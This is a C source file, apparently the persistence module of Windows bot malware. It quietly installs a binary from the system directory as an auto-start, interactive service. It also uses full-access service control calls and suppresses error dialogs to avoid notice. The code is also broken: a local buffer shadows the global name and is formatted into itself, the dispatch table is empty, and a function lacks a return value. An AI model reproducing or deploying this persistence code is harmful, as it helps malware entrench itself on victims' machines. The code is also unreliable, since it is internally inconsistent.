#ifndef SERVICE
#include "Include.h"
#include "externs.h"
SERVICE_STATUS svc_status;
SERVICE_STATUS_HANDLE svc_handle;

char *decryptsvc();

char *svclname = filename2;
int service();


void svc_ctrlhandler(unsigned long opcode)
/* ctrl handler for the service */
{
	switch(opcode)
	{
	case SERVICE_CONTROL_PAUSE:
		svc_status.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		svc_status.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_STOP:
		svc_status.dwWin32ExitCode = 0;
		svc_status.dwCurrentState = SERVICE_STOPPED;
		svc_status.dwCheckPoint = 0;
		svc_status.dwWaitHint = 0;
		SetServiceStatus(svc_handle, &svc_status);
		return;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	}
	SetServiceStatus(svc_handle,  &svc_status);
	return; 
}


void WINAPI svc_start(DWORD argc, LPTSTR *argv)
/* sets the service up */
{
	svc_status.dwServiceType = SERVICE_WIN32;
	svc_status.dwCurrentState = SERVICE_START_PENDING;
	svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	svc_status.dwWin32ExitCode = 0;
	svc_status.dwServiceSpecificExitCode = 0;
	svc_status.dwCheckPoint = 0;
	svc_status.dwWaitHint = 0;
	svc_handle = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)svc_ctrlhandler);
	svc_status.dwCurrentState = SERVICE_RUNNING;
	svc_status.dwCheckPoint = 0;
	svc_status.dwWaitHint = 0;
	SetServiceStatus(svc_handle, &svc_status);
	service();
}

int service()
{
	SERVICE_TABLE_ENTRY DispatchTable[] = {
		{ 0, 0 }
	};
	if(!StartServiceCtrlDispatcher(DispatchTable)) 
	{
		char sysdir[256];
		char filename2[256];
		SC_HANDLE hSCM;
		SC_HANDLE hService;
		SetErrorMode(SEM_NOGPFAULTERRORBOX);
		
		GetSystemDirectory(sysdir, sizeof(sysdir));
		_snprintf(filename2, sizeof(filename2), "%s\\%s", sysdir, filename2);
		hSCM = OpenSCManager(0, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		hService = OpenService(hSCM, svcname, SERVICE_ALL_ACCESS);
		if(!hService)
			hService = CreateService(
			hSCM, svcname, svclname,
			SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
			filename2,
			0, 0, 0, 0, 0);
		if(!hService)
			return 0;
		if(!StartService(hService, 0, 0))
			return 0;
	}
}

#endif